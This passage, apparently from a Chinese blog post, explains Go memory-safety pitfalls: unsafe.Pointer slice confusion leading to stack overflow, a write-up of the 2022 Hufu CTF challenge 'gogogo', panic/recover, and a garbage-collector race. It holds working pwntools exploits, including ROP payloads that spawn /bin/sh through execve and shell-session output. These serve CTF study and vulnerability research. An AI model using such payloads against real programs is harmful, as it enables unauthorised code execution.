padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
win_p = struct.pack("I", 0x47f23c) #0x4925d3)
nullbytes = "\0"*10

#print(pattern)
print(padding + win_p + nullbytes)

# ./exploit_win.py | main
# win!
# unexpected fault address 0xc00009afb8
# fatal error: fault
# [signal SIGSEGV: segmentation violation code=0x2 addr=0xc00009afb8 pc=0xc00009afb8]

# goroutine 1 [running]:
# runtime.throw({0x495d56, 0xc0000b4008})
#         /usr/local/go/src/runtime/panic.go:1198 +0x71 fp=0xc00009af80 sp=0xc00009af50 pc=0x42f991
# runtime: unexpected return pc for runtime.sigpanic called from 0xc00009afb8
# stack: frame={sp:0xc00009af80, fp:0xc00009afd0} stack=[0xc00009a000,0xc00009b000)
# 0x000000c00009ae80:  0x000000c0000c0000  0x000000c00009aec0 
# 0x000000c00009ae90:  0x000000000043104e <runtime.recordForPanic+0x000000000000004e>  0x0000000000000000
```
**漏洞机制**
使用unsafe.Pointer，将固定长度的数组转换为错误的长度。之后，数据被写入数组，导致缓冲区溢出。数据用函数的地址覆盖堆栈上存储的返回地址win。执行时，该win函数会在程序因堆栈损坏而崩溃之前打印一条消息。

还可以让其返回到特定的代码片段们获取shell：
```python
# -*- coding: UTF-8 -*-
from pwn import *

#context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('', )
# libc = ELF('./libc-2.31.so')
io = process('./main')
#libc = ELF('./libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

syscall = 0x474885 


# syscall nums
mprotect = 0xa
read = 0x0


# put it together

# padding
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"


binsh = 0xc00007a000
# send it
# dbg()
# pause()
io.sendline('/bin/sh\x00'*4+p64(syscall) + p64(0) + p64(59) +p64(binsh) + p64(0) + p64(0))

io.interactive()

# ➜  code-injection python exploit_rop.py
# [+] Starting local process './main': pid 64461
# [*] Switching to interactive mode
# $ ls
# 1       exp.py       exploit_stack.py  main
# README.md  exploit_rop.py  exploit_win.py    main.go
# $  
```
## 2022虎符pwn题gogogo

这是一道go的pwn题，之前没接触过，赛后一查发现早在19年就有大佬就golang这门安全性较高的语言进行分析，主要分析了golang的安全机制和打破golang安全性的usafe.Pointer的利用方式和poc，主要涉及了golang的函数调用方式和unsafe.Pointer任意类型转换的特性，主要是切片相关的数据结构，加上unsafe.Pionter的特性导致golang的栈溢出，可以实现栈内存泄露和栈内存覆盖。
目前只涉及到gopwn的栈溢出相关的利用。

go主要由于代码对数据的范围控制比较多，反编译后会有非常多的系统生成的条件判断语句，panic非常多，导致分析起来很不方便，利用也不容易，通常会结合unsafe包来制造栈溢出的情况，下面来看看这道题目。

### 题目分析

题目是go编译的二进制文件，只开了NX，并且go是静态编译的，默认不支持PIE和canary所以对调试和利用会方便些。打开程序，可以看到main_main函数，会让你输入一个数字，不同数字对应不同的功能，main函数只有一个read功能且没有溢出，但是通过引用发现，真正的函数入口似乎不再main_main里面，而是在math.init函数：
```c
  fmt_Fprintf();
  fmt_Fprintf();                                // are you sure?
  fmt_Fprintf();
  fmt_Fprintf();
  fmt_Fprintf();
  v116 = &unk_49D7C0;
  v117 = &unk_4CFC00;
  v83 = fmt_Fprintln();
  v94 = 0LL;
  runtime_makeslice(v64);
  bufio___ptr_Reader__Read(v70, v74, v83);      // unsafe.Pinter -> stack overflow
  if ( (_BYTE)v94 == 'y' || (_BYTE)v94 == 'Y' )
  {

//溢出的情况：
.text:0000000000494AC4                 lea     rcx, [rsp+4C0h+var_3B0]
.text:0000000000494ACC                 mov     edi, 1
.text:0000000000494AD1                 mov     rsi, rdi
.text:0000000000494AD4                 call    fmt_Fprintln
.text:0000000000494AD9                 mov     [rsp+4C0h+var_460], 0
.text:0000000000494AE2                 lea     rax, unk_49D900
.text:0000000000494AE9                 mov     ebx, 800h
.text:0000000000494AEE                 mov     rcx, rbx
.text:0000000000494AF1                 call    runtime_makeslice
.text:0000000000494AF6                 lea     rbx, [rsp+4C0h+var_460]  <--------
.text:0000000000494AFB                 mov     rax, cs:qword_5514E0
.text:0000000000494B02                 mov     ecx, 800h
.text:0000000000494B07                 mov     rdi, rcx
.text:0000000000494B0A                 call    bufio___ptr_Reader__Read
.text:0000000000494B0F                 movzx   edx, byte ptr [rsp+4C0h+var_460]

//正常情况
.text:000000000049511F                 lea     rax, unk_49D900
.text:0000000000495126                 mov     ebx, 20h ; ' '
.text:000000000049512B                 mov     rcx, rbx
.text:000000000049512E                 call    runtime_makeslice
.text:0000000000495133                 mov     rdx, cs:qword_5514E0
.text:000000000049513A                 mov     rbx, rax
.text:000000000049513D                 mov     ecx, 20h ; ' '
.text:0000000000495142                 mov     rdi, rcx
.text:0000000000495145                 mov     rax, rdx
.text:0000000000495148                 call    bufio___ptr_Reader__Read
.text:000000000049514D                 mov     rbp, [rsp+4C0h+var_8]
```
这里只截取漏洞部分，原理就是将slice和unsafe包一起使用，将slice结构体的data指针覆盖成大小比slice的cap小的局部变量指针导致在read的时候出现栈溢出的情况。
这里有个poc，可以解释其原理：
```golang
// initialize the reader outside of the main function to simplify POC development, as 
// there are less local variables on the stack.
var reader = bufio.NewReader(os.Stdin)

func main() {
    // this is a harmless buffer, containing some harmless data
    harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}

    // create a slice of length 512 byte, but assign the address of the harmless data as
    // its buffer. Use the reflect.SliceHeader to change the slice
    confusedSlice := make([]byte, 512)
    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&confusedSlice))
    harmlessDataAddress := uintptr(unsafe.Pointer(&(harmlessData[0])))
    sliceHeader.Data = harmlessDataAddress

    // now read into the confused slice from STDIN. This is not quite as bad as a gets()
    // call in C, but almost. The function will read up to 512 byte, but the underlying
    // buffer is only 8 bytes. This function is pretty much the complete vulnerability
    _, _ = reader.Read(confusedSlice)
}
```
将slice结构的data指针（512byte）变为局部变量harmlessData（8byte），导致后面`reader.Read(confusedSlice)`的时候出现栈溢出。

### 功能分析

题目让输入特定的数字进入不同功能，但是漏洞点只有在完成程序给的参数字游戏才能到达，所以要先过猜数字游戏，游戏玩法参考[这里](https://www.cnblogs.com/funlove/p/13215041.html),

规则就是：游戏规则：系统随机给出1-9的4位数字，您可以输入您猜测的4位数字，系统会比较并给予反馈，A表示数字对，且位置对，B表示数字对位置不对，如1A2B表示有1位您猜对了数字和位置，有2位您猜对数字，但位置不对。

解法就是穷举结果，必然有一个是对的，但是不能一个一个试，程序只有7次机会（爆破也可以，因为可以try again），这里只能随机输入一个数字，从answers里面排除，这样大概在5到6次就可以得出结果。之后会来到功能选择界面，这里直接选择退出，因为和漏洞点没有关系，之后来到漏洞点，输入payload进行rop即可。

### 利用步骤
go程序有以下syscall链子，浑然天成：
```c
.text:000000000047CF00 ; __int64 __usercall syscall_Syscall@<rax>()
.text:000000000047CF00 syscall_Syscall proc near               ; CODE XREF: syscall_Close+2B↑p
.text:000000000047CF00                                         ; syscall_fcntl+2F↑p ...
.text:000000000047CF00
.text:000000000047CF00 arg_0           = qword ptr  8
.text:000000000047CF00 arg_8           = qword ptr  10h
.text:000000000047CF00 arg_10          = qword ptr  18h
.text:000000000047CF00 arg_18          = qword ptr  20h
.text:000000000047CF00 arg_20          = qword ptr  28h
.text:000000000047CF00 arg_28          = qword ptr  30h
.text:000000000047CF00 arg_30          = qword ptr  38h
.text:000000000047CF00
.text:000000000047CF00                 call    sub_45D5C0
.text:000000000047CF05                 mov     rdi, [rsp+arg_8]         <---'/bin/sh\x00'-->
.text:000000000047CF0A                 mov     rsi, [rsp+arg_10]        <---0--->
.text:000000000047CF0F                 mov     rdx, [rsp+arg_18]        <---0--->
.text:000000000047CF14                 mov     rax, [rsp+arg_0]         <---59--->
.text:000000000047CF19                 syscall                 ; LINUX -    <---execve('/bin/sh',0,0)--->
.text:000000000047CF1B                 cmp     rax, 0FFFFFFFFFFFFF001h
```
1. 玩游戏win
2. 由于静态编译，程序里有天然的ropchain，找到syacall的rop链子，确定覆盖长度
3. 由于syscall是靠栈来传参数的，所以rop还是比较容易的,避免去找控制rdi、rsi、rdx的链子了（rdi/rsi链子不好找）
4. 输入payload，覆盖返回地址，获得shell。

### exp
slice的结构体指针有随机性，需要爆破1个字节，可多次尝试运行。事实上math_init是在循环内的，可以先泄露再劫持执行流。
```python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p=process("./gogogo")

def guessTrainner():
   start =time.time()
   answerSet=answerSetInit(set())
#    print answerSet
   for i in range(6):
      inputStrMax=suggestedNum(answerSet,100)
      print('第%d步----' %(i+1))
      print('尝试：' +inputStrMax)
      print('----')
      AMax,BMax = compareAnswer(inputStrMax)
      print('反馈：%dA%dB' % (AMax, BMax))
      print('----')
      print('排除可能答案：%d个' % (answerSetDelNum(answerSet,inputStrMax,AMax,BMax)))
      answerSetUpd(answerSet,inputStrMax,AMax,BMax)
      if AMax==4:
         elapsed = (time.time() - start)
         print("猜数字成功，总用时：%f秒，总步数：%d。" %(elapsed,i+1))
         break
      elif i==5:
         print("猜数字失败！")
 
# 获得反馈结果
def compareAnswer(inputStr):
    inputStr1 = inputStr[0]+' '+inputStr[1]+' '+inputStr[2]+' '+inputStr[3]
    p.sendline(inputStr1)
    ru('\n')
    tmp = p.recvuntil('B',timeout=0.5)
    # print(tmp)
    if tmp == '':
        return 4,4
    tmp = tmp.split("A")
    A = tmp[0]
    B = tmp[1].split('B')[0]
    return int(A),int(B)

# 比较inputstr和答案元组 返回结果
def compareAnswer1(inputStr,answerStr):
   A=0
   B=0
   for j in range(4):
      if inputStr[j]==answerStr[j]:
         A+=1
      else:
         for k in range(4):
            if inputStr[j]==answerStr[k]:
               B+=1
   return A,B
   
# 初始化答案元组
def answerSetInit(answerSet):
  answerSet.clear()
  for i in range(1234,9877):
    seti=set(str(i))
    print seti
    if len(seti)==4 and seti.isdisjoint(set('0')):
      answerSet.add(str(i))
  return answerSet
 
# 从元组里面删除排除的答案
def answerSetUpd(answerSet,inputStr,A,B):
   answerSetCopy=answerSet.copy()
   for answerStr in answerSetCopy:
      A1,B1=compareAnswer1(inputStr,answerStr)
      if A!=A1 or B!=B1:
         answerSet.remove(answerStr)

# 排除答案个数
def answerSetDelNum(answerSet,inputStr,A,B):
   i=0
   for answerStr in answerSet:
      A1, B1 = compareAnswer1(inputStr, answerStr)
      if A!=A1 or B!=B1:
         i+=1
   return i
 

def suggestedNum(answerSet,lvl):
   suggestedNum=''
   delCountMax=0
   if len(answerSet) > lvl:
      suggestedNum = list(answerSet)[0]
   else:
      for inputStr in answerSet:
         delCount = 0
         for answerStr in answerSet:
            A,B = compareAnswer1(inputStr, answerStr)
            delCount += answerSetDelNum(answerSet, inputStr,A,B)
         if delCount > delCountMax:
            delCountMax = delCount
            suggestedNum = inputStr
         if delCount == delCountMax:
            if suggestedNum == '' or int(suggestedNum) > int(inputStr):
               suggestedNum = inputStr
 
   return suggestedNum
 
#text:0000000000494AF6                 lea     rbx, [rsp+4C0h+var_460]
ru("PLEASE INPUT A NUMBER:")
p.sendline("1717986918")
ru("PLEASE INPUT A NUMBER:")
p.sendline("1234") 
# gdb.attach(p)
# p.sendline("305419896")
# p.interactive()
# p.interactive()
ru("YOU HAVE SEVEN CHANCES TO GUESS")
guessTrainner()
sa("AGAIN OR EXIT?","exit")
gdb.attach(p)
sla("(4) EXIT","4")
syscall = 0x47CF05
# syscall = 0x000000000042c066
binsh = 0xc0000be000

payload = '/bin/sh\x00'*0x8c + p64(syscall) + p64(0) + p64(59) + p64(binsh) + p64(0) + p64(0)
 
sla("ARE YOU SURE?",payload)
p.interactive()
 

```

## panic/recover/defer

panic和recover成对出现，panic改变程序流程，recover恢复panic崩溃，defer延迟执行。可以在代码中使用 recover 来会恢复程序中意想不到的 panic，而 panic 只会触发当前 goroutine 中的 defer 操作。

**panic触发的递归延迟调用**
panic 能够改变程序的控制流，调用 panic 后会立刻停止执行当前函数的剩余代码，并在当前 Goroutine 中递归执行调用方的 defer；
recover 可以中止 panic 造成的程序崩溃。它是一个只能在 defer 中发挥作用的函数，在其他作用域中调用不会发挥作用；

下面的示例代码中，无法在 main 函数中 recover 另一个goroutine中引发的 panic。
```go
func f1() {
	defer func() {
		if e := recover(); e != nil {
			fmt.Printf("recover panic:%v\n", e)
		}
	}()
	// 开启一个goroutine执行任务
	go func() {
		fmt.Println("in goroutine....")
		// 只能触发当前goroutine中的defer
		panic("panic in goroutine")
	}()

	time.Sleep(time.Second)
	fmt.Println("exit")
}
```

执行上面的 f1 函数会得到如下结果：

```bash
in goroutine....
panic: panic in goroutine

goroutine 6 [running]:
main.f1.func2()
        /Users/liwenzhou/workspace/github/the-road-to-learn-golang/ch12/goroutine_recover.go:20 +0x65
created by main.f1
        /Users/liwenzhou/workspace/github/the-road-to-learn-golang/ch12/goroutine_recover.go:17 +0x48

Process finished with exit code 2
```
从输出结果可以看到程序并没有正常退出，而是由于 panic 异常退出了（exit code 2）。

正如上面示例演示的那样，在启用 goroutine 去执行任务的场景下，如果想要 recover goroutine中可能出现的 panic 就需要在 goroutine 中使用 recover。就像下面的 f2 函数那样。

```go
func f2() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("recover outer panic:%v\n", r)
		}
	}()
	// 开启一个goroutine执行任务
	go func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("recover inner panic:%v\n", r)
			}
		}()
		fmt.Println("in goroutine....")
		// 只能触发当前goroutine中的defer
		panic("panic in goroutine")
	}()

	time.Sleep(time.Second)
	fmt.Println("exit")
}
```

执行 f2 函数会得到如下输出结果。
```bash
in goroutine....
recover inner panic:panic in goroutine
exit
```

程序中的 panic 被 recover 成功捕获，程序最终正常退出。

**总结** 

1. panic 只会触发当前 Goroutine 的 defer；
2. recover 只有在 defer 中调用才会生效；
3. panic 允许在 defer 中嵌套多次调用；

## GC Race Condition

**GO中的垃圾回收机制：**
go为程序员提供内存管理，它会自动为对象实例或值（例如整数、切片或结构体）分配内存。它还跟踪这些对象是否仍在使用，并在它们不再使用时释放内存。

Go 垃圾收集器作为自己的 Goroutine 在后台运行。事实上，它是多个 Goroutines。垃圾收集器可以通过调用`runtime.GC()`手动触发，但通常它会在堆大小翻倍时自动运行。这个大小阈值可以通过GOGC环境变量进行调整。它是以百分比设置的。默认值为 100，这意味着堆必须增长 100% 才能触发垃圾回收。例如，将其设置为 200 意味着只有在堆增长到之前大小的三倍时才开始收集。在大小条件之上还有一个时序条件：只要进程没有挂起，垃圾收集器就会至少每两分钟运行一次。

Go 使用Mark-and-Sweep 垃圾收集器。这种类型的垃圾收集包括两个阶段：

1. Mark：通过递归跟踪所有引用，从范围内的变量开始，标记可达堆对象
2. Sweep：未标记的对象被释放

![2](/upload/2022/09/2.png)

堆中的浅蓝色框是可访问的对象（通过箭头所示的引用）。白色物体是无法到达的，将在回收阶段被释放。

**GC race condition最小demo**
如下：
```go
package main

import (
	"bufio"
	"fmt"
	"os"
	"reflect"
	"time"
	"unsafe"
)

func main() {
	go heapHeapHeap()

	readAndHaveFun()
}

func unsafeStringToBytes(s *string) []byte {
	sh := (*reflect.StringHeader)(unsafe.Pointer(s))
	sliceHeader := &reflect.SliceHeader{
		Data: sh.Data,
		Len:  sh.Len,
		Cap:  sh.Len,
	}

	// CHANGE:
	time.Sleep(1 * time.Nanosecond)

	return *(*[]byte)(unsafe.Pointer(sliceHeader))
}

func readAndHaveFun() {
	reader := bufio.NewReader(os.Stdin)
	count := 1
	var firstChar byte

	for {
		s, _ := reader.ReadString('\n')
		if len(s) == 0 {
			continue
		}
		firstChar = s[0]

		// HERE BE DRAGONS
		bytes := unsafeStringToBytes(&s)

		_, _ = reader.ReadString('\n')

		if len(bytes) > 0 && bytes[0] != firstChar {
			fmt.Printf("win! after %d iterations\n", count)
			os.Exit(0)
		}

		count++
	}
}

func heapHeapHeap() {
	var a *[]byte
	for {
		tmp := make([]byte, 1000000, 1000000)
		a = &tmp
		_ = a
	}
}
```
**漏洞机制**
一个 Goroutine（线程）不断地分配和释放堆内存，从而增加了垃圾收集器的压力。它将使得堆的大小较上次翻倍，因此 将会触发GC的回收机制。

主 Goroutine 同时重复地从标准输入中读取一行，记住变量中的第一个字符，将字符串转换为[]byte切片，然后将另一行读取为字符串。如果结果[]byte切片中的第一个字节与字符串中存储的第一个字节不同，则 POC 会打印一条win消息。


关键点在这个字符串s，它通过unsafe.Pointer转换成slice的底层数组，而这个slice不是从实际的slice创建的，所以GC并不会认为s在函数内存在引用，此时GC会回收掉s的指针，但是函数使用unsafe.pointer将sliceheader显示转换成了[]byte返回,此时如果再有实例重用这个空间就会改变之前的数值。
以上函数会有三种结果：

1. 函数返回时GC没有回收s指针,程序正常
2. 函数返回之前GC恰好回收了s指针，再次使用该释放的指针后GC检测出堆中存在不安全指针，报错
3. 函数返回之前GC恰好回收了s指针，slice指向一个悬空指针，且立即重用该指针，成功返回，GC不报错

想要完成改变数值需要满足以下条件：

1. 触发GC的回收机制（申请大小超过200%时会触发GC回收）
2. GC恰好在函数内释放掉s指针，且立即重用该指针

# refer

1. [Usafe Pointer POC](https://github.com/jlauinger/go-unsafepointer-poc)
2. [Usafe Pointer](https://dev.to/jlauinger/exploitation-exercise-with-unsafe-pointer-in-go-information-leak-part-1-1kga)
3. [GOlang unsafe.Pointer](https://www.jianshu.com/p/7c8e395b2981)
4. [panic/recover](https://draveness.me/golang/docs/part2-foundation/ch05-keyword/golang-panic-recover/)